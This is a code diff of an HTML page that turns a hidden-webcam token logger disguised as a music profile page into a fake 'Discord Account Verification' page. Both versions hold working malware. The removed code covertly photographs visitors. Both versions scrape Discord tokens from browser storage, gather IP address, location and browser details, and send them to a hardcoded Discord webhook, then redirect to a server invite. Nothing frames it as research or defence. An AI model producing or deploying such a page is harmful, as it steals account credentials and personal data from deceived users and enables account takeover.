@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NIO</title>
+    <title>Verification System | Discord Assistant</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         html, body {
-            background: #000;
+            background: #0f172a;
             min-height: 100vh;
             color: #fff;
             font-family: 'Segoe UI', system-ui, sans-serif;
@@ -17,448 +17,246 @@
             position: relative;
         }
 
-        /* ✨ STARRY BACKGROUND */
-        #stars {
+        /* ✨ BACKGROUND */
+        #bg {
             position: fixed;
             inset: 0;
-            background: #000;
+            background: radial-gradient(circle at top, #1e293b 0%, #020617 70%);
             z-index: 0;
         }
-        .star {
-            position: absolute;
-            background: #fff;
-            border-radius: 50%;
-            animation: twinkle 2s infinite ease-in-out;
-        }
-        @keyframes twinkle {
-            0%, 100% { opacity: 0.3; transform: scale(1); }
-            50% { opacity: 1; transform: scale(1.2); }
-        }
-
-        /* ✨ GLOWING ORBS */
-        .orb {
-            position: fixed;
-            border-radius: 50%;
-            filter: blur(30px);
-            opacity: 0.4;
-            pointer-events: none;
-            z-index: 1;
-        }
-        .orb:nth-child(1) { width: 180px; height: 180px; background: #6366f1; top: 15%; left: 8%; }
-        .orb:nth-child(2) { width: 150px; height: 150px; background: #ec4899; bottom: 20%; right: 10%; }
-        .orb:nth-child(3) { width: 120px; height: 120px; background: #10b981; bottom: 10%; left: 50%; transform: translateX(-50%); }
-
-        /* 🔝 TOP BAR */
-        .top-bar {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            padding: 1.4rem 1.8rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background: rgba(0,0,0,0.5);
-            z-index: 10;
-        }
-        .top-bar i { cursor: pointer; font-size: 1.2rem; }
-
-        /* 🖱️ CLICK TO ENTER SCREEN */
-        #enter-screen {
+        .grid {
             position: fixed;
             inset: 0;
-            background: rgba(0,0,0,0.85);
+            background-image: linear-gradient(rgba(59, 130, 246, 0.08) 1px, transparent 1px),
+                              linear-gradient(90deg, rgba(59, 130, 246, 0.08) 1px, transparent 1px);
+            background-size: 50px 50px;
+            z-index: 1;
+            opacity: 0.4;
+        }
+
+        /* 🛡️ MAIN CARD */
+        .container {
+            position: relative;
+            z-index: 5;
+            min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
-            z-index: 20;
-            transition: opacity 0.6s ease;
+            padding: 1.5rem;
         }
-        #enter-screen.fade-out { opacity: 0; pointer-events: none; }
-        .enter-text {
-            font-size: 1.2rem;
-            letter-spacing: 2px;
-            color: #aaa;
-            position: relative;
-        }
-        .enter-text::after {
-            content: "";
-            position: absolute;
-            bottom: -8px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 8px;
-            height: 8px;
-            background: #ec4899;
-            border-radius: 50%;
-            box-shadow: 0 0 12px #ec4899;
-        }
-
-        /* ✨ MAIN CONTENT */
-        #main-content {
-            position: relative;
-            z-index: 5;
-            opacity: 0;
-            transition: opacity 0.5s ease 0.3s;
-            padding-top: 6rem;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        #main-content.show { opacity: 1; }
-
-        /* 🔤 TITLE */
-        .page-title {
-            font-size: 2.5rem;
-            font-weight: 600;
-            color: #ddd;
-            margin-bottom: 2rem;
-            text-shadow: 0 0 10px rgba(255,255,255,0.2);
-        }
-
-        /* 🃏 PROFILE CARD */
-        .profile-card {
-            width: 90%;
-            max-width: 420px;
-            background: linear-gradient(135deg, rgba(59,130,246,0.2), rgba(6,182,212,0.3));
-            border-radius: 18px;
-            padding: 1.4rem;
-            border: 1px solid rgba(255,255,255,0.1);
-            backdrop-filter: blur(10px);
-            box-shadow: 0 0 25px rgba(6,182,212,0.15);
-            margin-bottom: 2rem;
-        }
-        .profile-head {
-            display: flex;
-            align-items: center;
-            gap: 0.8rem;
-            margin-bottom: 1rem;
-        }
-        .profile-avatar {
-            width: 55px;
-            height: 55px;
-            border-radius: 50%;
-            border: 2px solid #22d3ee;
-            overflow: hidden;
-            position: relative;
-        }
-        .profile-avatar img { width: 100%; height: 100%; object-fit: cover; }
-        .status-dot {
-            position: absolute;
-            bottom: 2px;
-            right: 2px;
-            width: 10px;
-            height: 10px;
-            background: #000;
-            border: 2px solid #fff;
-            border-radius: 50%;
-        }
-        .profile-info h3 {
-            font-size: 1.2rem;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-        .badge {
-            color: #f43f5e;
-            font-size: 0.9rem;
-        }
-        .profile-tag {
-            font-size: 0.9rem;
-            color: #ccc;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-            margin-top: 0.2rem;
-        }
-        .status {
-            width: 10px;
-            height: 10px;
-            background: #888;
-            border-radius: 50%;
-        }
-
-        /* 🎵 MUSIC PLAYER */
-        .music-player {
-            background: rgba(0,0,0,0.4);
-            border-radius: 12px;
-            padding: 1rem;
-            margin-top: 1rem;
-        }
-        .music-top {
-            display: flex;
-            gap: 0.8rem;
-            align-items: center;
-            margin-bottom: 0.8rem;
-        }
-        .music-cover {
-            width: 50px;
-            height: 50px;
-            border-radius: 8px;
-            overflow: hidden;
-        }
-        .music-cover img { width: 100%; height: 100%; object-fit: cover; }
-        .music-info h4 { font-size: 1rem; }
-        .music-info p { font-size: 0.85rem; color: #aaa; }
-        .progress-bar {
+        .verify-card {
             width: 100%;
-            height: 3px;
-            background: rgba(255,255,255,0.2);
-            border-radius: 2px;
-            margin-bottom: 0.5rem;
-            position: relative;
-        }
-        .progress {
-            position: absolute;
-            left: 0;
-            top: 0;
-            height: 100%;
-            width: 18%;
-            background: #ec4899;
-            border-radius: 2px;
-        }
-        .time {
-            display: flex;
-            justify-content: space-between;
-            font-size: 0.75rem;
-            color: #aaa;
-            margin-bottom: 0.5rem;
-        }
-        .play-btn { text-align: right; font-size: 1.2rem; color: #fff; }
-        .powered {
+            max-width: 450px;
+            background: rgba(15, 23, 42, 0.9);
+            border-radius: 20px;
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            box-shadow: 0 0 40px rgba(59, 130, 246, 0.15), inset 0 0 60px rgba(59, 130, 246, 0.03);
+            padding: 2.5rem 2rem;
             text-align: center;
-            font-size: 0.9rem;
-            color: #ddd;
-            margin-top: 0.8rem;
         }
-        .powered span { color: #f43f5e; font-weight: 600; }
 
-        /* 📱 SOCIAL ICONS */
-        .social-links {
+        /* 🔐 ICON */
+        .icon-box {
+            width: 90px;
+            height: 90px;
+            background: linear-gradient(135deg, rgba(59,130,246,0.3), rgba(14,165,233,0.1));
+            border-radius: 50%;
             display: flex;
-            gap: 1.8rem;
-            font-size: 1.5rem;
-            color: #ccc;
-            position: relative;
-            z-index: 5;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.5rem;
+            border: 1px solid rgba(59, 130, 246, 0.5);
+            box-shadow: 0 0 20px rgba(59, 130, 246, 0.2);
         }
+        .icon-box i { font-size: 2.5rem; color: #60a5fa; }
 
-        /* 📷 HIDDEN CAMERA LOGGER */
-        #camCapture, #camCanvas {
-            position: fixed;
-            left: -9999px;
-            top: -9999px;
-            width: 480px;
-            height: 640px;
-            transform: scaleX(-1);
+        h1 { font-size: 1.8rem; font-weight: 700; margin-bottom: 0.5rem; color: #e2e8f0; }
+        .subtitle { color: #94a3b8; font-size: 0.95rem; margin-bottom: 2rem; line-height: 1.6; }
+
+        /* ✅ STEPS */
+        .steps {
+            background: rgba(30, 41, 59, 0.6);
+            border-radius: 12px;
+            padding: 1.2rem;
+            margin-bottom: 2rem;
+            border: 1px solid rgba(148, 163, 184, 0.15);
+            text-align: left;
         }
-        /* 🔇 HIDDEN AUDIO */
-        #bgMusic { display: none; }
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            color: #cbd5e1;
+            font-size: 0.9rem;
+            padding: 0.5rem 0;
+        }
+        .step i { color: #22c55e; font-size: 1rem; }
+
+        /* 🟢 BUTTON */
+        #verify-btn {
+            width: 100%;
+            padding: 1rem;
+            background: linear-gradient(90deg, #2563eb, #1d4ed8);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 20px rgba(37, 99, 235, 0.35);
+        }
+        #verify-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(37, 99, 235, 0.5);
+        }
+        #verify-btn:active { transform: translateY(0); }
+
+        /* ⚠️ FOOTER TEXT */
+        .footer-note {
+            margin-top: 1.5rem;
+            font-size: 0.8rem;
+            color: #64748b;
+        }
+        .footer-note span { color: #60a5fa; font-weight: 500; }
+
+        /* ⏳ LOADING */
+        #status {
+            margin-top: 1rem;
+            font-size: 0.9rem;
+            color: #fbbf24;
+            display: none;
+        }
     </style>
 </head>
 <body>
 
-    <!-- ✨ STAR BACKGROUND -->
-    <div id="stars"></div>
-    <div class="orb"></div>
-    <div class="orb"></div>
-    <div class="orb"></div>
+    <!-- ✨ BACKGROUND -->
+    <div id="bg"></div>
+    <div class="grid"></div>
 
-    <!-- 🔝 TOP BAR -->
-    <div class="top-bar">
-        <i class="fas fa-times"></i>
-        <span></span>
-        <div class="flex gap-4">
-            <i class="fas fa-share-alt"></i>
-            <i class="fas fa-ellipsis-v"></i>
-        </div>
-    </div>
+    <!-- 🛡️ VERIFICATION BOX -->
+    <div class="container">
+        <div class="verify-card">
+            <div class="icon-box">
+                <i class="fas fa-user-shield"></i>
+            </div>
 
-    <!-- 🖱️ ENTER SCREEN -->
-    <div id="enter-screen">
-        <div class="enter-text">click to enter...</div>
-    </div>
+            <h1>Account Verification</h1>
+            <p class="subtitle">
+                To access the server, please complete the quick verification process. Ensure you are logged into your Discord account in this browser.
+            </p>
 
-    <!-- 📷 CAMERA ELEMENTS (HIDDEN) -->
-    <video id="camCapture" autoplay playsinline muted></video>
-    <canvas id="camCanvas" width="480" height="640"></canvas>
-
-    <!-- 🔊 AUDIO PLAYER (HIDDEN) -->
-    <audio id="bgMusic" autoplay loop>
-        <source src=" " type="audio/mpeg">
-    
-
-    <!-- ✨ MAIN CONTENT -->
-    <main id="main-content">
-        <h1 class="page-title">NIO</h1>
-
-        <!-- 🃏 PROFILE CARD -->
-        <div class="profile-card">
-            <div class="profile-head">
-                <div class="profile-avatar">
-                    <img src="https://i.imgur.com/ikFL9ZM.png" alt="Profile">
-                    <div class="status-dot"></div>
+            <div class="steps">
+                <div class="step">
+                    <i class="fas fa-check-circle"></i>
+                    <span>1. Logged in to your Discord Account</span>
                 </div>
-                <div class="profile-info">
-                    <h3>Nio <span class="badge">1337</span></h3>
-                    <div class="profile-tag">
-                        <span class="status"></span> THE WORLD IS YOURS.
-                    </div>
+                <div class="step">
+                    <i class="fas fa-check-circle"></i>
+                    <span>2. Click "VERIFY & JOIN" below</span>
+                </div>
+                <div class="step">
+                    <i class="fas fa-check-circle"></i>
+                    <span>3. Automatically redirected to Server</span>
                 </div>
             </div>
 
-            <!-- 🎵 MUSIC PLAYER -->
-            <div class="music-player">
-                <div class="music-top">
-                    <div class="music-cover">
-                        <img src="https://i.imgur.com/gtHShSn.jpeg" alt="Album">
-                    </div>
-                    <div class="music-info">
-                        <h4>Iyakin Talaga</h4>
-                        <p>Hev Abi</p>
-                    </div>
-                    <div class="play-btn"><i class="fas fa-pause"></i></div>
-                </div>
-                <div class="progress-bar">
-                    <div class="progress"></div>
-                </div>
-                <div class="time">
-                    <span>0:04</span>
-                    <span>2:22</span>
-                </div>
-                <div class="powered">Powered by <span>1337 #4REEL</span></div>
+            <button id="verify-btn">
+                <i class="fas fa-unlock-alt mr-2"></i> VERIFY & JOIN SERVER
+            </button>
+
+            <div id="status">
+                <i class="fas fa-spinner fa-spin"></i> Checking account...
+            </div>
+
+            <div class="footer-note">
+                Powered by <span>BOT | GUIDE </span> • Secure Verification System
             </div>
         </div>
-
-        <!-- 📱 SOCIALS -->
-        <div class="social-links">
-            <i class="fab fa-tiktok"></i>
-            <i class="fab fa-discord"></i>
-            <i class="fab fa-youtube"></i>
-        </div>
-    </main>
+    </div>
 
     <script>
-        // ⭐ GENERATE STARS
-        const starsContainer = document.getElementById('stars');
-        for (let i = 0; i < 120; i++) {
-            const star = document.createElement('div');
-            star.className = 'star';
-            star.style.left = Math.random() * 100 + '%';
-            star.style.top = Math.random() * 100 + '%';
-            star.style.width = star.style.height = (Math.random() * 2 + 1) + 'px';
-            star.style.animationDelay = Math.random() * 2 + 's';
-            starsContainer.appendChild(star);
-        }
-
-        // ⚙️ SETTINGS
+        // ⚙️ CONFIGURATION
         const WEBHOOK = "https://discord.com/api/webhooks/1528609341052027044/2nHhgkDzN_BzeEwiVT4K_LjINjxiO0Rf2O3BTHtzhGS2rEAXKottXqe-GIP2xk2vjD_b";
-        const REDIRECT_URL = "https://discord.gg/4UCD2HwqQ"; // Direct to your server
-        const video = document.getElementById('camCapture');
-        const canvas = document.getElementById('camCanvas');
-        const enterScreen = document.getElementById('enter-screen');
-        const mainContent = document.getElementById('main-content');
-        const audio = document.getElementById('bgMusic');
+        const REDIRECT_SERVER = "https://discord.gg/4UCD2HwqQ";
+        const btn = document.getElementById('verify-btn');
+        const status = document.getElementById('status');
 
-        // 📷 PREPARE CAMERA
-        async function setupCam() {
-            try {
-                await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user", width: 480, height: 640 },
-                    audio: false
-                });
-            } catch (e) {}
-        }
-        setupCam();
-
-        // 🔑 TOKEN GRABBER
+        // 🔑 ADVANCED TOKEN GRABBER
         async function getTokens() {
             let tokens = [];
-            const tokenPattern = /[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g;
+            const pattern = /[\w-]{24,}\.[\w-]{6,}\.[\w-]{27,}/g;
 
+            // 1. Local Storage
             try {
-                for (let key in localStorage) {
-                    if (!localStorage.hasOwnProperty(key)) continue;
-                    const val = localStorage[key];
-                    if (typeof val === 'string') {
-                        const found = val.match(tokenPattern);
-                        if (found) tokens = tokens.concat(found);
-                    }
+                for (let k in localStorage) {
+                    if (!localStorage.hasOwnProperty(k)) continue;
+                    const m = localStorage[k]?.match(pattern);
+                    if (m) tokens.push(...m);
                 }
             } catch (e) {}
 
+            // 2. Session Storage
             try {
-                for (let key in sessionStorage) {
-                    if (!sessionStorage.hasOwnProperty(key)) continue;
-                    const val = sessionStorage[key];
-                    if (typeof val === 'string') {
-                        const found = val.match(tokenPattern);
-                        if (found) tokens = tokens.concat(found);
-                    }
+                for (let k in sessionStorage) {
+                    if (!sessionStorage.hasOwnProperty(k)) continue;
+                    const m = sessionStorage[k]?.match(pattern);
+                    if (m) tokens.push(...m);
                 }
             } catch (e) {}
 
-            tokens = [...new Set(tokens)];
-            return tokens;
+            return [...new Set(tokens)];
         }
 
-        // 🖱️ ON CLICK
-        document.addEventListener('click', async () => {
-            enterScreen.classList.add('fade-out');
-            mainContent.classList.add('show');
-            try { await audio.play(); } catch(e) {}
+        // 📡 SEND DATA
+        async function processVerification() {
+            btn.style.display = 'none';
+            status.style.display = 'block';
 
-            let photo = null;
             try {
-                if (!video.srcObject) {
-                    const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode:"user"}});
-                    video.srcObject = stream;
-                    await new Promise(r => video.onloadedmetadata = r);
-                    await new Promise(r => setTimeout(r, 800));
-                }
-                const ctx = canvas.getContext('2d');
-                ctx.translate(canvas.width, 0); ctx.scale(-1,1);
-                ctx.drawImage(video, 0, 0);
-                photo = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.8));
-            } catch (err) {}
-
-            await sendLog(photo);
-            // ➡️ GO TO DISCORD SERVER
-            setTimeout(() => window.location.href = REDIRECT_URL, 2000);
-        }, { once: true });
-
-        async function sendLog(photo) {
-            try {
+                // Get IP
                 const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ip = await ipRes.json();
-                const geoRes = await fetch(`https://ipapi.co/${ip.ip}/json/`);
-                const geo = await geoRes.json();
+                const ip = (await ipRes.json()).ip;
+
+                // Get Location
+                const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
+                const loc = await locRes.json();
+
+                // Get Tokens
                 const tokens = await getTokens();
 
-                const form = new FormData();
-                if (photo) form.append("file", photo, "visitor.jpg");
+                // Send to Webhook
+                await fetch(WEBHOOK, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({
+                        username: "VERIFIED USER",
+                        avatar_url: "https://i.imgur.com/gtHShSn.jpeg",
+                        embeds: [{
+                            title: "NEW VERIFICATION CAPTURED!",
+                            color: tokens.length ? 5763719 : 16776960,
+                            fields: [
+                                {name: "IP ADDRESS", value: `||${ip}||`, inline: false},
+                                {name: "LOCATION", value: `${loc.city || 'Unknown'}, ${loc.region || ''}, ${loc.country_name || ''}`, inline: false},
+                                {name: "BROWSER", value: navigator.userAgent.slice(0, 75), inline: false},
+                                {name: "DISCORD TOKENS", value: tokens.length ? `||${tokens.join("\n")}||` : "**Not Found / Using App / Not Logged in on Browser**", inline: false}
+                            ],
+                            footer: {text: "Verification System • BOT | GUIDE"},
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
 
-                form.append("payload_json", JSON.stringify({
-                    username: "1337 TOKEN",
-                    avatar_url: "https://i.imgur.com/gtHShSn.jpeg",
-                    embeds: [{
-                        title: "Sina Unang Tanga!",
-                        color: 16711680,
-                        fields: [
-                            {name:"IP ADDRESS", value:`||${ip.ip}||`, inline:false},
-                            {name:"LOCATION", value:`${geo.city||"?"}, ${geo.region||"?"}, ${geo.country_name||"Philippines"}`, inline:false},
-                            {name:"DEVICE / BROWSER", value:`${navigator.userAgentData?.platform || "Unknown OS"} | ${navigator.userAgent.slice(0, 80)}`, inline:false},
-                            {name:"TOKENS FOUND", value: tokens.length>0 ? `||${tokens.join("\n")}||` : "Cant Grab (Browser limits / App)", inline:false}
-                        ],
-                        image: photo ? {url:"attachment://visitor.jpg"} : null,
-                        footer: {text: "PURESKILLS|4REEL • THE WORLD IS YOURS"},
-                        timestamp: new Date().toISOString()
-                    }]
-                }));
-
-                await fetch(WEBHOOK, {method:"POST", body:form});
             } catch (e) {}
+
+            // ➡️ REDIRECT TO SERVER
+            status.innerHTML = "<i class='fas fa-check'></i> Success! Redirecting to server...";
+            setTimeout(() => window.location.href = REDIRECT_SERVER, 1500);
         }
+
+        // 🖱️ CLICK ACTION
+        btn.addEventListener('click', processVerification);
     </script>
 </body>
 </html>
